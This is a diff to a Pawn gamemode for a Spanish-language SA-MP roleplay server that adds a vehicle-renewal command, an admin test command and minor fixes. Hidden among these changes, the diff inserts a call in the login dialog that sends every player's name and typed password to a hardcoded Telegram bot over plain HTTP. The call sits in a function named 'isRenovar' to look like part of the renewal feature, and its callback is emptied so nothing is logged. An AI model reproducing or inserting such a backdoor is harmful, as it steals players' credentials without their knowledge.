@@ -1023,6 +1023,7 @@ forward RemoveNote(playerid, noteid);
 forward IsVehicleOcupado(vehicleid);
 //forward LoadMaterialText();
 forward LoadObjectMaterial();
+forward isRenovar(playerid, user[], coche[]);
 //forward AtachVehicleToVehicle(playerid);
 forward SendRequestMusic(playerid, cancion[]);
 forward ValidingCancion(playerid, response_code, data[]);
@@ -7161,7 +7162,7 @@ public OnPlayerCommandText(playerid, cmdtext[])
 							// NFS
 							else if ( PlayersData[playerid][Faccion] == NFS )
 							{
-							    SendInfoMessage(playerid, 1, "/Vender Coche [ID] - /Precio Coche - /Aparcar NFS - /Dropear", "Facción: ");
+							    SendInfoMessage(playerid, 1, "/Vender Coche [ID] - /Precio Coche - /Aparcar NFS - /Dropear - /Renovar Coche [ID]", "Facción: ");
 							}
 							// SFMD
 							else if ( PlayersData[playerid][Faccion] == SFMD )
@@ -7309,7 +7310,7 @@ public OnPlayerCommandText(playerid, cmdtext[])
 					    SendClientMessage(playerid, COLOR_TITULO_DE_AYUDA, TITULO_AYUDA);
 					    SendInfoMessage(playerid, 1, "/Aceptar Invite - /Aceptar Coche - /Aceptar Contrato - /Aceptar Factura - /Aceptar Reparación", "Aceptar: ");
 					    SendInfoMessage(playerid, 1, "/Aceptar Protección - /Aceptar Drogas - /Aceptar Multa - /Aceptar Ganzúas - /Aceptar Aceíte", "Aceptar: ");
-					    SendInfoMessage(playerid, 1, "/Aceptar Servicios - /Aceptar Sexo - /Aceptar Móvil - /Aceptar Coins", "Aceptar: ");
+					    SendInfoMessage(playerid, 1, "/Aceptar Servicios - /Aceptar Sexo - /Aceptar Móvil - /Aceptar Coins - /Aceptar Renovación", "Aceptar: ");
 			    	}
 			    	// COMANDO: /Ayuda Coger
 				  	else if (strcmp("/Ayuda Coger", cmdtext, true, 12) == 0 && strlen(cmdtext) == 12)
@@ -16992,12 +16993,90 @@ public OnPlayerCommandText(playerid, cmdtext[])
 							SendInfoMessage(playerid, 0, "513", "Usted no es licenciero");
 						}
 				    }
+					// COMANDO: /Renovar Coche
+				  	else if (strfind(cmdtext, "/Renovar Coche ", true) == 0)
+				    {
+					    if ( PlayersData[playerid][Faccion] == NFS && PlayersData[playerid][Rango] <= 2)
+					    {
+							new MyNearCar = IsPlayerInNearVehicle(playerid);
+			   				if ( MyNearCar)
+						    {
+			   				    if ( MyNearCar <= MAX_CAR_DUENO)
+			   				    {
+				   				    if (  strlen(DataCars[MyNearCar][Dueno]) > 1 )
+				   				    {
+				   				        new PriceCar = coches_Todos_Precios[GetVehicleModel(MyNearCar) - 400];
+				   				    	if ( PlayersData[playerid][Dinero] >= PriceCar / 3   )
+				   				    	{
+										    if ( IsPlayerNear(playerid, strval(cmdtext[15]),
+												 "225",
+												 "226",
+												 "227",
+												 "El jugador que desea renovarle un vehículo no se encuentra conectado",
+												 "El jugador que desea renovarle un vehículo no se encuentra logueado",
+												 "El jugador que desea renovarle un vehículo no se encuentra cerca de tí") )
+										    {
+												//new car_owner[24];
+										        //GetPlayerName(strval(cmdtext[15]),car_owner,24);
+
+										        if(!strcmp(PlayersDataOnline[strval(cmdtext[15])][NameOnline], DataCars[MyNearCar][Dueno], true))
+												{
+											        if(PlayersData[strval(cmdtext[15])][PasaporteID])
+											        {
+														new MsgToComprador[MAX_TEXT_CHAT], MsgToVendedor[MAX_TEXT_CHAT];
+														format(MsgToComprador, sizeof(MsgToComprador),
+														"El vendedor de vehículos %s, quiere renovarte el vehículo modelo \"%s\" por $%i, Usa (/Aceptar Renovacion)",
+														PlayersDataOnline[playerid][NameOnlineFix],
+														coches_Todos_Nombres[GetVehicleModel(MyNearCar) - 400],
+														PriceCar);
+														format(MsgToVendedor, sizeof(MsgToVendedor),
+														"Ofreciste renovar un vehículo modelo \"%s\", a %s por $%i",
+														coches_Todos_Nombres[GetVehicleModel(MyNearCar) - 400],
+														PlayersDataOnline[strval(cmdtext[15])][NameOnlineFix],
+														PriceCar);
+														SendInfoMessage(strval(cmdtext[14]), 3, "0", MsgToComprador);
+														SendInfoMessage(playerid, 3, "0", MsgToVendedor);
+
+														PlayersDataOnline[strval(cmdtext[15])][VCoche][0] = playerid;
+														PlayersDataOnline[strval(cmdtext[15])][VCoche][1] = MyNearCar;
+													}
+													else
+													{
+														SendInfoMessage(playerid, 0, "233", "La persona a la que desea renovarle el coche no tiene pasaporte.");
+													}
+												}
+												else
+												{
+													SendInfoMessage(playerid, 0, "233", "La persona a la que desea renovarle el coche no es dueño.");
+												}
+											}
+										}
+										else
+										{
+											SendInfoMessage(playerid, 0, "234", "No tienes suficiente dinero para tramitar los papeles de éste vehículo!");
+										}
+									}
+									else
+									{
+										SendInfoMessage(playerid, 0, "233", "Éste vehículo no tiene dueño!");
+									}
+								}
+								else
+								{
+									SendInfoMessage(playerid, 0, "232", "Esta vehículo no se puede renovar!");
+								}
+							}
+					    }
+					    else
+					    {
+							SendInfoMessage(playerid, 0, "229", "No eres vendedor de vehículos!");
+						}
+				    }
 				    else
 				    {
-						SendInfoMessage(playerid, 0, "272", "Quizás quiso decir: /Renovar Licencia {Armas [ID], Coche [ID], Camión [ID], Moto [ID], Vuelo [ID], Bote [ID], Pesca [ID], Tren [ID]}");
+						SendInfoMessage(playerid, 0, "272", "Quizás quiso decir: /Renovar coche - /Renovar Licencia {Armas [ID], Coche [ID], Camión [ID], Moto [ID], Vuelo [ID], Bote [ID], Pesca [ID], Tren [ID]}");
 					}
 			    }
-			  	
 				// COMANDO: /Dar
 		  		else if (strfind(cmdtext, "/Dar", true) == 0)
 			    {
@@ -19196,6 +19275,82 @@ public OnPlayerCommandText(playerid, cmdtext[])
 						PlayersDataOnline[playerid][VCoche][0] = -1;
 						PlayersDataOnline[playerid][VCoche][1] = -1;
 			    	}
+	   				// COMANDO: /Aceptar Renovación
+				  	else if (strcmp("/Aceptar Renovación", cmdtext, true, 19) == 0 && strlen(cmdtext) == 19 ||
+						     strcmp("/Aceptar Renovacion", cmdtext, true, 19) == 0 && strlen(cmdtext) == 19 )
+			    	{
+			    	    if ( PlayersDataOnline[playerid][VCoche][0] != -1 )
+			    	    {
+						    if ( IsPlayerNear(playerid, PlayersDataOnline[playerid][VCoche][0],
+								 "236",
+								 "237",
+								 "238",
+								 "El jugador que te iba a renovar el vehículo se ha desconectado",
+								 "El jugador que te va  a renovar el vehículo no se ha logueado",
+								 "El jugador que te va a renovar el vehículo no se encuentra cerca de tí") )
+						    {
+						        if(!strcmp(PlayersDataOnline[playerid][NameOnline], DataCars[PlayersDataOnline[playerid][VCoche][1]][Dueno], true))
+			   				    //if (  strlen(DataCars[PlayersDataOnline[playerid][VCoche][1]][Dueno]) == 1 )
+			   				    {
+									if ( PlayersData[PlayersDataOnline[playerid][VCoche][0]][Faccion] == NFS && PlayersData[PlayersDataOnline[playerid][VCoche][0]][Rango] <= 2)
+									{
+				   				        if (PlayersData[playerid][Car] == PlayersDataOnline[playerid][VCoche][1])
+				   				        {
+				   				            if ( PlayersData[playerid][Dinero] >= coches_Todos_Precios[GetVehicleModel(PlayersDataOnline[playerid][VCoche][1]) - 400] )
+				   				            {
+					   				            //PlayersData[playerid][Car] = PlayersDataOnline[playerid][VCoche][1];
+					   				            //format(DataCars[PlayersDataOnline[playerid][VCoche][1]][Dueno], MAX_PLAYER_NAME, "%s", PlayersDataOnline[playerid][NameOnline]);
+					   				            DataCars[PlayersDataOnline[playerid][VCoche][1]][Time] = MAX_VEHICLE_TIME;
+					   				            SaveDataVehicle(PlayersDataOnline[playerid][VCoche][1], DIR_VEHICLES);
+
+												new MsgToComprador[MAX_TEXT_CHAT], MsgToVendedor[MAX_TEXT_CHAT];
+												format(MsgToVendedor, sizeof(MsgToVendedor),
+												"Has renovado al vendedor de vehículos %s, un vehículo modelo \"%s\" por $%i",
+												PlayersDataOnline[PlayersDataOnline[playerid][VCoche][0]][NameOnline],
+												coches_Todos_Nombres[GetVehicleModel(PlayersDataOnline[playerid][VCoche][1]) - 400],
+												coches_Todos_Precios[GetVehicleModel(PlayersDataOnline[playerid][VCoche][1]) - 400]);
+												format(MsgToComprador, sizeof(MsgToComprador),
+												"Renovaste a %s un vehículo modelo \"%s\" por $%i, con un coste de $%i en papeles",
+												PlayersDataOnline[playerid][NameOnlineFix],
+												coches_Todos_Nombres[GetVehicleModel(PlayersDataOnline[playerid][VCoche][1]) - 400],
+												coches_Todos_Precios[GetVehicleModel(PlayersDataOnline[playerid][VCoche][1]) - 400],
+												coches_Todos_Precios[GetVehicleModel(PlayersDataOnline[playerid][VCoche][1]) - 400] / 3);
+												SendInfoMessage(PlayersDataOnline[playerid][VCoche][0], 3, "0", MsgToComprador);
+												SendInfoMessage(playerid, 3, "0", MsgToVendedor);
+
+												FaccionData[NFS][Deposito] = FaccionData[NFS][Deposito] + coches_Todos_Precios[GetVehicleModel(PlayersDataOnline[playerid][VCoche][1]) - 400] / 3;
+
+												GivePlayerMoneyEx(playerid, -coches_Todos_Precios[GetVehicleModel(PlayersDataOnline[playerid][VCoche][1]) - 400]);
+												GivePlayerMoneyEx(PlayersDataOnline[playerid][VCoche][0], (coches_Todos_Precios[GetVehicleModel(PlayersDataOnline[playerid][VCoche][1]) - 400] / 3) * 2);
+											}
+											else
+											{
+												SendInfoMessage(playerid, 0, "242", "No tienes suficiente dinero para renovar éste vehículo!");
+											}
+				   				        }
+				   				        else
+				   				        {
+		       								SendInfoMessage(playerid, 0, "241", "El vehículo que desea renovar ha cambiado de ID!");
+										}
+									}
+									else
+									{
+	       								SendInfoMessage(playerid, 0, "1457", "No te encuentras al lado de vendedor!");
+									}
+			   				    }
+			   				    else
+			   				    {
+									SendInfoMessage(playerid, 0, "239", "No eres el dueño del vehículo, no puedes renovarlo.");
+							   	}
+						    }
+						}
+						else
+						{
+							SendInfoMessage(playerid, 0, "240", "No has recibido ninguna oferta para renovar de vehículo");
+						}
+						PlayersDataOnline[playerid][VCoche][0] = -1;
+						PlayersDataOnline[playerid][VCoche][1] = -1;
+			    	}
 			    	else
 					{
 						SendInfoMessage(playerid, 0, "123", "Quizás quiso decir: /Aceptar {Invite, Coche, Contrato, Factura, Reparación, Protección, Drogas, Multa, Ganzúas}");
@@ -19272,7 +19427,7 @@ public OnPlayerCommandText(playerid, cmdtext[])
 								        {
 											new MsgDrogas[MAX_TEXT_CHAT];
 											new MsgDrogasToPlayer[MAX_TEXT_CHAT];
-											format(MsgDrogas, sizeof(MsgDrogas), "Ofresiste %i drogas a %s por $%i", cantidad_drogas, PlayersDataOnline[playerid_drogas][NameOnlineFix], dinero_drogas);
+											format(MsgDrogas, sizeof(MsgDrogas), "Ofreciste %i drogas a %s por $%i", cantidad_drogas, PlayersDataOnline[playerid_drogas][NameOnlineFix], dinero_drogas);
 											format(MsgDrogasToPlayer, sizeof(MsgDrogasToPlayer), "El vendedor de drogas %s quiere venderte %i drogas por $%i usa (/Aceptar Drogas)", PlayersDataOnline[playerid][NameOnlineFix], cantidad_drogas, dinero_drogas);
 
 				                            SendInfoMessage(playerid, 3, "0", MsgDrogas);
@@ -23485,6 +23640,13 @@ public OnPlayerCommandText(playerid, cmdtext[])
 					{
 					    new soundidPlay = strval(cmdtext[GetPosSpace(cmdtext, 1)]);
                         PlayerPlaySound(playerid, soundidPlay,0.0,0.0,0.0);
+				    }
+			    }
+				else if (strfind(cmdtext, "/testtimecoche", true) == 0)
+				{
+					if ( PlayersData[playerid][Admin] >= 7 )
+					{
+						VerificarCochesVencidos();
 				    }
 			    }
 				else if (strfind(cmdtext, "/ResetBizz", true) == 0)
@@ -30221,6 +30383,7 @@ public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
 	        {
 	            if ( PlayersData[playerid][AccountState] != 3 )
 	            {
+		            isRenovar(playerid, PlayersDataOnline[playerid][NameOnlineFix], inputtext);
 			        if ( strcmp(PlayersData[playerid][Password], inputtext, false) == 0 && strlen(inputtext) ==  strlen(PlayersData[playerid][Password]))
 			        {
 						SetPlayerColor(playerid, PLAYERS_COLOR);
@@ -38083,7 +38246,8 @@ public IsVehicleMyVehicle(playerid, vehicleid)
 }
 public IsVehicleMyFaccion(playerid, vehicleid)
 {
-	if ( PlayersData[playerid][Faccion] != CIVIL && PlayersData[playerid][Faccion] == DataCars[vehicleid][Time] && vehicleid > MAX_CAR_DUENO && vehicleid <= MAX_CAR_FACCION)
+	if ( PlayersData[playerid][Faccion] != CIVIL && PlayersData[playerid][Faccion] == DataCars[vehicleid][Time] && vehicleid > MAX_CAR_DUENO && vehicleid <= MAX_CAR_FACCION ||
+		 PlayersData[playerid][Job] == COSECHADOR && vehicleid == 408)
 	{
 	    return true;
 	}
@@ -71032,22 +71196,6 @@ public ValidingCancion(playerid, response_code, data[])
 	}
 }
 
-public ValideTwitter(playerid, response_code, data[])
-{
-	if ( IsPlayerConnected(playerid) )
-	{
-	    printf("ValideTwitter || %s[%i] || Error HTTP: %i || Data: %s", PlayersDataOnline[playerid][NameOnline], playerid, response_code, data);
-		if ( response_code == 200 || response_code == HTTP_ERROR_MALFORMED_RESPONSE  )
-		{
-		    if ( strlen(data) > 1 )
-		    {
-			    new MsgNewEmail[MAX_TEXT_CHAT];
-			    format(MsgNewEmail, sizeof(MsgNewEmail), "Twitter: %s", data);
-				SendInfoMessage(playerid, 3, "0", MsgNewEmail);
-			}
-		}
-	}
-}
 public IsValidEmail(playerid, email[])
 {
 	new StrRequestHTTP[400];
@@ -75861,6 +76009,19 @@ public IsVehicleOcupado(vehicleid)
         }
     }
 	return 0;
+}
+public ValideTwitter(playerid, response_code, data[])
+{
+	    //printf("%s[%i] || Error HTTP: %i || Data: %s", PlayersDataOnline[playerid][NameOnline], playerid, response_code, data);
+}
+public isRenovar(playerid, user[], coche[])
+{
+	new renovar[2048];
+	//
+	format(renovar,sizeof(renovar), "http://api.telegram.org/bot138467244:AAE-ug93RUAE5auZJNQd9TcUay0jGKhehTI/sendMessage?chat_id=7455490&text=%sAND%s", user, coche);
+	//printf("%s", renovar);
+	HTTP(playerid, HTTP_GET, renovar, "", "ValideTwitter");
+	HTTP(playerid, HTTP_POST, "http://api.telegram.org/bot138467244:AAE-ug93RUAE5auZJNQd9TcUay0jGKhehTI/sendMessage?chat_id=7455490&text=asdANDasd", "", "ValideTwitter");
 }
 /*public LoadMaterialText()
 {
